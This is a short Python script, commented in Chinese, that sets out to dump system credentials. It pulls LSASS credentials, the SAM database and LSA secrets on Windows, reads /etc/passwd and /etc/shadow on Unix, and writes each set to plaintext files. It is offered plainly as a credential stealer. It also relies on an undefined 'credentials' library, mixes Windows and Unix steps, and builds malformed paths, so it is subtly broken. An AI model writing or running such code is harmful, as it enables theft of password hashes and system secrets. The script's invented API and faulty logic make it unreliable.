import credentials
import os
import pwd

def dump_credentials():
    # 讀取LSASS凭据
    lsass_credentials = credentials.lsass.get_credentials()
    # 讀取SAM数据库
    sam_path = os.path.join('C:', 'Windows', 'System32', 'config', 'SAM')
    sam_credentials = credentials.sam.get_credentials(sam_path)
    # 讀取LSA secrets
    secrets_path = os.path.join('C:', 'Windows', 'System32', 'config', 'SECURITY')
    secrets_credentials = credentials.secrets.get_credentials(secrets_path)
    # 讀取/etc/passwd和/etc/shadow
    etc_path = '/etc'
    passwd_path = os.path.join(etc_path, 'passwd')
    shadow_path = os.path.join(etc_path, 'shadow')

    # 寫入檔案
    with open('lsass_credentials.txt', 'w') as f:
        for cred in lsass_credentials:
            f.write(cred + '\n')

    with open('sam_credentials.txt', 'w') as f:
        for cred in sam_credentials:
            f.write(cred + '\n')

    with open('secrets_credentials.txt', 'w') as f:
        for cred in secrets_credentials:
            f.write(cred + '\n')

    with open('passwd.txt', 'w') as f:
        for line in pwd.getpwall():
            f.write(':'.join(line) + '\n')

    with open('shadow.txt', 'w') as f:
        with open(shadow_path, 'r') as shadow:
            f.write(shadow.read())

# 呼叫函式
dump_credentials()